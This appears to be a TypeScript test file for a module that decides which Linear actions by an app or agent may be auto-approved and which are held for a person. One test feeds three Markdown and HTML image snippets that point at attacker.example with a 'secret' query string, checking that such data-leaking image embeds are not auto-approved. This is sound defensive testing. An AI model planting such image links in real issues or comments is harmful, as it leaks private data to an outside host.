import { describe, expect, it } from "vitest";
import type { RawIssue, RawUser } from "../src/linear-api";
import type { StoredActionDraft } from "../src/linear";
import { LINEAR_ACTION_KINDS, autoApprovableKindsOf, autoApprovalOf } from "../src/linear-auto-approval";

const person: RawUser = { id: "user-1", name: "Ada", app: false };
const appUser: RawUser = { id: "app-1", name: "Coding Agent", app: true };
// A member read without the `app` field, as a stale cache entry would be.
const unknownUser: RawUser = { id: "user-2", name: "Grace" };

const createIssue = (assignee?: RawUser, description?: string): StoredActionDraft => ({
  kind: "createIssue",
  input: { teamId: "team-1", title: "New", description, ...(assignee ? { assigneeId: assignee.id } : {}) },
  provisionalId: "~1",
  synthetic: { id: "~1", assignee: assignee ?? null } as RawIssue,
  title: "Create issue",
});

const updateIssue = (
  input: Extract<StoredActionDraft, { kind: "updateIssue" }>["input"],
  patch: Extract<StoredActionDraft, { kind: "updateIssue" }>["patch"] = {},
): StoredActionDraft => ({ kind: "updateIssue", issueRef: "issue-1", input, previous: {}, patch, title: "Update" });

const archive = (archived: boolean): StoredActionDraft =>
  ({ kind: "archive", issueRef: "issue-1", archived, title: archived ? "Archive" : "Unarchive" });

describe("autoApprovalOf", () => {
  it("lets issue creation be auto-approved", () => {
    expect(autoApprovalOf(createIssue()))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.createIssue, autoApprovable: true });
    expect(autoApprovalOf(createIssue(person)).autoApprovable).toBe(true);
  });

  it("holds an issue created for an app user, or a user not known to be a person, for a person", () => {
    expect(autoApprovalOf(createIssue(appUser)))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.createIssue, autoApprovable: false });
    expect(autoApprovalOf(createIssue(unknownUser)).autoApprovable).toBe(false);
  });

  it("files title and description edits under edit-issues", () => {
    for (const input of [{ title: "Renamed" }, { description: "Body" }, { description: "" }]) {
      expect(autoApprovalOf(updateIssue(input)))
        .toEqual({ actionKind: LINEAR_ACTION_KINDS.editIssue, autoApprovable: true });
    }
  });

  it("files planning edits under plan-issues", () => {
    const inputs = [
      { stateId: "state-1" }, { priority: 2 }, { projectId: "project-1" }, { projectId: null },
      { dueDate: "2026-11-01" }, { dueDate: null }, { parentId: "issue-2" }, { parentId: null },
      { assigneeId: null },
    ];
    for (const input of inputs) {
      expect(autoApprovalOf(updateIssue(input)))
        .toEqual({ actionKind: LINEAR_ACTION_KINDS.planIssue, autoApprovable: true });
    }
    expect(autoApprovalOf(updateIssue({ assigneeId: person.id }, { assignee: person })).autoApprovable).toBe(true);
  });

  it("holds assigning an issue to an app user, or a user not known to be a person, for a person", () => {
    expect(autoApprovalOf(updateIssue({ assigneeId: appUser.id }, { assignee: appUser })))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.planIssue, autoApprovable: false });
    expect(autoApprovalOf(updateIssue({ assigneeId: unknownUser.id }, { assignee: unknownUser })).autoApprovable)
      .toBe(false);
  });

  it("lets label, comment and team label changes be auto-approved", () => {
    expect(autoApprovalOf({ kind: "addLabels", issueRef: "issue-1", labelIds: ["l"], labels: [], title: "Add" }))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.editLabels, autoApprovable: true });
    expect(autoApprovalOf({ kind: "removeLabels", issueRef: "issue-1", labelIds: ["l"], title: "Remove" }))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.editLabels, autoApprovable: true });
    expect(autoApprovalOf({
      kind: "postComment", issueRef: "issue-1", body: "Hi",
      synthetic: { id: "~c", body: "Hi" } as Extract<StoredActionDraft, { kind: "postComment" }>["synthetic"],
      title: "Comment",
    })).toEqual({ actionKind: LINEAR_ACTION_KINDS.postComment, autoApprovable: true });
    expect(autoApprovalOf({
      kind: "createLabel", teamId: "team-1", name: "bug",
      synthetic: { id: "~l", name: "bug" } as Extract<StoredActionDraft, { kind: "createLabel" }>["synthetic"],
      title: "Create label",
    })).toEqual({ actionKind: LINEAR_ACTION_KINDS.createLabel, autoApprovable: true });
  });

  it("holds Markdown that embeds an image for a person, whose URL Linear would load", () => {
    const images = [
      "See ![chart](https://attacker.example/p.png?d=secret)",
      "![x][ref]\n\n[ref]: //attacker.example/p.png",
      "<IMG src=\"https://attacker.example/p.png\">",
    ];
    const comment = (body: string): StoredActionDraft => ({
      kind: "postComment", issueRef: "issue-1", body,
      synthetic: { id: "~c", body } as Extract<StoredActionDraft, { kind: "postComment" }>["synthetic"],
      title: "Comment",
    });
    for (const markdown of images) {
      expect(autoApprovalOf(updateIssue({ description: markdown })))
        .toEqual({ actionKind: LINEAR_ACTION_KINDS.editIssue, autoApprovable: false });
      expect(autoApprovalOf(comment(markdown)))
        .toEqual({ actionKind: LINEAR_ACTION_KINDS.postComment, autoApprovable: false });
      expect(autoApprovalOf(createIssue(undefined, markdown)))
        .toEqual({ actionKind: LINEAR_ACTION_KINDS.createIssue, autoApprovable: false });
    }
    const text = "Fixed in [the PR](https://github.com/o/r/pull/1). Wow!";
    expect(autoApprovalOf(updateIssue({ description: text })).autoApprovable).toBe(true);
    expect(autoApprovalOf(comment(text)).autoApprovable).toBe(true);
    expect(autoApprovalOf(createIssue(person, text)).autoApprovable).toBe(true);
  });

  it("never auto-approves archiving, but lets a restore be under its own kind", () => {
    expect(autoApprovalOf(archive(true)))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.archiveIssue, autoApprovable: false });
    expect(autoApprovalOf(archive(false)))
      .toEqual({ actionKind: LINEAR_ACTION_KINDS.restoreIssue, autoApprovable: true });
    expect(LINEAR_ACTION_KINDS.archiveIssue.tag).not.toBe(LINEAR_ACTION_KINDS.restoreIssue.tag);
  });
});

describe("autoApprovableKindsOf", () => {
  const tags = (resourceKind: "workspace" | "team" | "issue") =>
    autoApprovableKindsOf(resourceKind).map(kind => kind.tag).toSorted();

  it("lists every kind a workspace or team session can auto-approve, and never archiving", () => {
    const expected = ["create-issues", "create-labels", "edit-issues", "edit-labels", "plan-issues",
      "post-comments", "restore-issues"];
    expect(tags("workspace")).toEqual(expected);
    expect(tags("team")).toEqual(expected);
  });

  it("leaves team labels out of an issue binding, which cannot create them", () => {
    expect(tags("issue")).toEqual(["create-issues", "edit-issues", "edit-labels", "plan-issues",
      "post-comments", "restore-issues"]);
  });

  it("gives every kind a distinct tag", () => {
    const all = Object.values(LINEAR_ACTION_KINDS).map(kind => kind.tag);
    expect(new Set(all).size).toBe(all.length);
  });
});
